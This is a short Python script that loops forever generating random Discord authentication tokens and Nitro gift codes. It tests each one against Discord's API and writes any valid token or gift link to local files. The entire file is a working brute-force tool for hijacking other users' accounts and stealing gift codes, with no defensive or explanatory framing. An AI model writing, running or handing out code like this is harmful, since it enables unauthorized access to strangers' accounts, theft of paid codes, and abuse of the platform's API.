from requests import get
from random import choices

token_string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

nitro_string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

class color:
	green = '\033[92m'
	red = '\033[91m'
	gray = '\033[90m'
	reset = '\033[0m'

def token():
	token = "".join(choices(token_string, k = 26)) + "." + "".join(choices(token_string, k = 6)) + "." + "".join(choices(token_string, k = 38))
	if token[0] == "-" or token[0] == "_":
		return
	res = get('https://discord.com/api/v9/users/@me', headers = {'Authorization': token})
	if res.status_code == 200:
		print(f"{color.green}[VALID]{color.reset} - {token}")
		with open("token.txt", "a") as f:
			f.write(f"{token}\n")
	elif res.status_code == 401:
		print(f"{color.red}[INVALID]{color.reset} - {token}")
	elif res.status_code == 403:
		print(f"{color.gray}[LOCK]{color.reset} - {token}")

def nitro():
	nitro = "".join(choices(nitro_string, k = 16))
	res = get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")
	if res.status_code == 200:
		print(f"{color.green}[VALID]{color.reset} - https://discord.gift/{nitro}")
		with open("nitro.txt", "a") as f:
			f.write(f"https://discord.gift/{nitro}\n")
	else:
		print(f"{color.red}[INVALID]{color.reset} - https://discord.gift/{nitro}")

while True:
	token()
	nitro()
